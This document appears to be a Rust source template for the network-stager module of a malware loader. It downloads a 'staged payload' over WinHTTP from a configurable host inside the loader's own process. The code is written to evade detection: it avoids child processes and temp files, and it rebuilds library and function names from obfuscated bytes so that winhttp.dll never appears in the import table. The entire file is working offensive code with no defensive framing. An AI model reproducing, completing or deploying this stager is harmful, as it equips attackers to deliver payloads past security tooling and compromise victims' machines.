// --- Network stager: in-process transport (WinHTTP) ---
//
// The payload is fetched over WinHTTP from the loader's own process: no child
// process appears and no temp file is written. `winhttp.dll` and every entry
// point are resolved at run time (the library and function names are rebuilt
// from obfuscated bytes), so no WinHTTP name reaches `.rdata` and the DLL never
// enters the loader's import table.

use std::ffi::c_void;

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

/// `WinHttpOpen(pwszAgentW, dwAccessType, pwszProxyW, pwszProxyBypassW, dwFlags)`.
type FnWinHttpOpen =
    unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> *mut c_void;
/// `WinHttpConnect(hSession, pswzServerName, nServerPort, dwReserved)`.
type FnWinHttpConnect =
    unsafe extern "system" fn(*mut c_void, *const u16, u16, u32) -> *mut c_void;
/// `WinHttpOpenRequest(hConnect, pwszVerb, pwszObjectName, pwszVersion,
/// pwszReferrer, ppwszAcceptTypes, dwFlags)`.
type FnWinHttpOpenRequest = unsafe extern "system" fn(
    *mut c_void,
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    *const *const u16,
    u32,
) -> *mut c_void;
/// `WinHttpSetTimeouts(hInternet, nResolveTimeout, nConnectTimeout,
/// nSendTimeout, nReceiveTimeout)`.
type FnWinHttpSetTimeouts = unsafe extern "system" fn(*mut c_void, i32, i32, i32, i32) -> i32;
/// `WinHttpSetOption(hInternet, dwOption, lpBuffer, dwBufferLength)`.
type FnWinHttpSetOption =
    unsafe extern "system" fn(*mut c_void, u32, *const c_void, u32) -> i32;
/// `WinHttpSendRequest(hRequest, pwszHeaders, dwHeadersLength, lpOptional,
/// dwOptionalLength, dwTotalLength, dwContext)`.
type FnWinHttpSendRequest =
    unsafe extern "system" fn(*mut c_void, *const u16, u32, *const c_void, u32, u32, usize) -> i32;
/// `WinHttpReceiveResponse(hRequest, lpReserved)`.
type FnWinHttpReceiveResponse = unsafe extern "system" fn(*mut c_void, *const c_void) -> i32;
/// `WinHttpQueryHeaders(hRequest, dwInfoLevel, pwszName, lpBuffer,
/// lpdwBufferLength, lpdwIndex)`.
type FnWinHttpQueryHeaders =
    unsafe extern "system" fn(*mut c_void, u32, *const u16, *mut c_void, *mut u32, *mut u32) -> i32;
/// `WinHttpQueryDataAvailable(hRequest, lpdwNumberOfBytesAvailable)`.
type FnWinHttpQueryDataAvailable = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
/// `WinHttpReadData(hRequest, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)`.
type FnWinHttpReadData =
    unsafe extern "system" fn(*mut c_void, *mut c_void, u32, *mut u32) -> i32;
/// `WinHttpCloseHandle(hInternet)`.
type FnWinHttpCloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

/// `WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY`: the system proxy configuration and,
/// failing that, the default proxy — what Windows 8.1+ applications use.
const ACCESS_TYPE_AUTOMATIC_PROXY: u32 = 4;
/// `WINHTTP_FLAG_SECURE`: the request goes over TLS.
const FLAG_SECURE: u32 = 0x0080_0000;
/// `WINHTTP_OPTION_REDIRECT_POLICY` with `WINHTTP_OPTION_REDIRECT_POLICY_ALWAYS`:
/// follow redirects the way `curl -L` does.
const OPTION_REDIRECT_POLICY: u32 = 88;
const REDIRECT_POLICY_ALWAYS: u32 = 2;
/// `WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER`: the response status
/// as a `DWORD`.
const QUERY_STATUS_CODE_NUMBER: u32 = 19 | 0x2000_0000;

/// The resolved `winhttp.dll` entry points.
struct WinHttpApi {
    open: FnWinHttpOpen,
    connect: FnWinHttpConnect,
    request: FnWinHttpOpenRequest,
    timeouts: FnWinHttpSetTimeouts,
    set_option: FnWinHttpSetOption,
    send: FnWinHttpSendRequest,
    receive: FnWinHttpReceiveResponse,
    headers: FnWinHttpQueryHeaders,
    available: FnWinHttpQueryDataAvailable,
    read: FnWinHttpReadData,
    close: FnWinHttpCloseHandle,
}

/// Resolves every entry point from `winhttp.dll`.
///
/// A dynamic lookup adds only the `LoadLibraryA`/`GetProcAddress` pair the
/// loader already imports; `winhttp.dll` itself stays out of the IAT.
fn load_winhttp() -> Result<WinHttpApi, String> {
    let library_name =
        std::ffi::CString::new($WINHTTP_DLL_DEF$).map_err(|_| $MSG_BAD_LIBRARY_NAME$)?;
    let library = unsafe { LoadLibraryA(PCSTR(library_name.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_LIBRARY_MISSING$)?;

    let resolve = |name: String| -> Result<usize, String> {
        let name = std::ffi::CString::new(name).map_err(|_| $MSG_BAD_ENTRY_NAME$)?;
        let address = unsafe { GetProcAddress(library, PCSTR(name.as_ptr() as *const u8)) }
            .ok_or_else(|| $MSG_ENTRY_MISSING$)?;
        // The function pointer is type-erased to its address; `copy` below
        // re-types it to the prototype the alias documents.
        Ok(address as usize)
    };
    // SAFETY: each export is re-typed to the documented WinHTTP prototype (see
    // the aliases) and both are pointer-sized, so copying the address into the
    // alias is the same reinterpretation every dynamic loader makes.
    Ok(WinHttpApi {
        open: unsafe { std::mem::transmute_copy(&resolve($FN_OPEN_DEF$)?) },
        connect: unsafe { std::mem::transmute_copy(&resolve($FN_CONNECT_DEF$)?) },
        request: unsafe { std::mem::transmute_copy(&resolve($FN_REQUEST_DEF$)?) },
        timeouts: unsafe { std::mem::transmute_copy(&resolve($FN_TIMEOUTS_DEF$)?) },
        set_option: unsafe { std::mem::transmute_copy(&resolve($FN_SET_OPTION_DEF$)?) },
        send: unsafe { std::mem::transmute_copy(&resolve($FN_SEND_DEF$)?) },
        receive: unsafe { std::mem::transmute_copy(&resolve($FN_RECEIVE_DEF$)?) },
        headers: unsafe { std::mem::transmute_copy(&resolve($FN_HEADERS_DEF$)?) },
        available: unsafe { std::mem::transmute_copy(&resolve($FN_AVAILABLE_DEF$)?) },
        read: unsafe { std::mem::transmute_copy(&resolve($FN_READ_DEF$)?) },
        close: unsafe { std::mem::transmute_copy(&resolve($FN_CLOSE_DEF$)?) },
    })
}

/// Closes whatever was opened, newest handle first, when the fetch ends —
/// success or error. Every non-null handle comes from the calls below and is
/// closed exactly once.
struct Handles {
    close: FnWinHttpCloseHandle,
    session: *mut c_void,
    connect: *mut c_void,
    request: *mut c_void,
}

impl Drop for Handles {
    fn drop(&mut self) {
        // SAFETY: request/connect/session were returned by
        // WinHttpOpenRequest/WinHttpConnect/WinHttpOpen and are closed through
        // the resolved WinHttpCloseHandle, in the order WinHTTP requires.
        unsafe {
            if !self.request.is_null() {
                let _ = (self.close)(self.request);
            }
            if !self.connect.is_null() {
                let _ = (self.close)(self.connect);
            }
            if !self.session.is_null() {
                let _ = (self.close)(self.session);
            }
        }
    }
}

/// A null-terminated UTF-16 copy of `text` for the W-APIs.
fn wide(text: &str) -> Vec<u16> {
    text.encode_utf16().chain(std::iter::once(0)).collect()
}

/// Fetches the configured URL with WinHTTP and returns the body.
///
/// TLS is validated by Schannel's defaults, redirects are followed, and a
/// response status of 400 or more fails the fetch: an error page must never be
/// staged as if it were the payload.
fn fetch() -> Result<Vec<u8>, String> {
    let host: String = $WINHTTP_HOST_DEF$;
    let path: String = $WINHTTP_PATH_DEF$;
    let agent: String = $WINHTTP_AGENT_DEF$;
    let verb: String = $GET_VERB_DEF$;
    crate::tech_dbg!("network_stager", "fetching the staged payload in-process");

    let api = load_winhttp()?;
    // A negative timeout is meaningless to WinHTTP; clamp instead of wrapping.
    let timeout = ($TIMEOUT_MS$).min(i32::MAX as u32) as i32;
    let host_w = wide(&host);
    let path_w = wide(&path);
    let agent_w = wide(&agent);
    let verb_w = wide(&verb);

    let session = unsafe {
        (api.open)(
            agent_w.as_ptr(),
            ACCESS_TYPE_AUTOMATIC_PROXY,
            std::ptr::null(),
            std::ptr::null(),
            0,
        )
    };
    if session.is_null() {
        return Err($MSG_SESSION_FAILED$);
    }
    let mut handles = Handles {
        close: api.close,
        session,
        connect: std::ptr::null_mut(),
        request: std::ptr::null_mut(),
    };
    if unsafe { (api.timeouts)(session, timeout, timeout, timeout, timeout) } == 0 {
        return Err($MSG_SESSION_FAILED$);
    }

    let connect = unsafe { (api.connect)(session, host_w.as_ptr(), $WINHTTP_PORT$, 0) };
    if connect.is_null() {
        return Err($MSG_CONNECT_FAILED$);
    }
    handles.connect = connect;

    let secure = if $WINHTTP_SECURE$ { FLAG_SECURE } else { 0 };
    let request = unsafe {
        (api.request)(
            connect,
            verb_w.as_ptr(),
            path_w.as_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            secure,
        )
    };
    if request.is_null() {
        return Err($MSG_REQUEST_FAILED$);
    }
    handles.request = request;

    let policy: u32 = REDIRECT_POLICY_ALWAYS;
    if unsafe {
        (api.set_option)(
            request,
            OPTION_REDIRECT_POLICY,
            &policy as *const u32 as *const c_void,
            4,
        )
    } == 0
    {
        return Err($MSG_REQUEST_FAILED$);
    }

    if unsafe { (api.send)(request, std::ptr::null(), 0, std::ptr::null(), 0, 0, 0) } == 0 {
        return Err($MSG_SEND_FAILED$);
    }
    if unsafe { (api.receive)(request, std::ptr::null()) } == 0 {
        return Err($MSG_NO_RESPONSE$);
    }

    let mut status: u32 = 0;
    let mut status_len: u32 = 4;
    if unsafe {
        (api.headers)(
            request,
            QUERY_STATUS_CODE_NUMBER,
            std::ptr::null(),
            &mut status as *mut u32 as *mut c_void,
            &mut status_len,
            std::ptr::null_mut(),
        )
    } == 0
    {
        return Err($MSG_NO_RESPONSE$);
    }
    if status >= 400 {
        return Err(format!("{} ({status})", $MSG_STATUS_FAILED$));
    }

    let mut bytes: Vec<u8> = Vec::new();
    loop {
        let mut available: u32 = 0;
        if unsafe { (api.available)(request, &mut available) } == 0 {
            return Err($MSG_BODY_FAILED$);
        }
        if available == 0 {
            break;
        }
        let mut chunk = vec![0u8; available as usize];
        let mut read: u32 = 0;
        if unsafe {
            (api.read)(
                request,
                chunk.as_mut_ptr() as *mut c_void,
                available,
                &mut read,
            )
        } == 0
        {
            return Err($MSG_BODY_FAILED$);
        }
        chunk.truncate(read as usize);
        bytes.extend_from_slice(&chunk);
    }
    crate::tech_dbg!("network_stager", "fetched {} bytes in-process", bytes.len());
    Ok(bytes)
}
